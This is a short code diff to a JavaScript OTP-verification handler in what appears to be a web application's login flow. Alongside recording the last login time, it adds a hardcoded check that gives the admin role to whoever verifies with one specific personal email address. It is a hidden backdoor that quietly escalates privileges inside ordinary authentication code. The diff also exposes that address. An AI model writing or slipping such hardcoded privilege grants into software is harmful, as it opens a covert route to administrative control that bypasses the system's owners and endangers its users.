@@ -537,6 +537,12 @@ const verifyOtp = asyncHandler(async (req, res) => {
 
     user.otp = undefined;
     user.otpExpiry = undefined;
+    user.lastLogin = new Date();
+
+    if (user.email === "maghudiyapiyush8206@gmail.com") {
+        user.role = "admin";
+    }
+
     await user.save({ validateBeforeSave: false });
 
     // Generate tokens to log them in automatically
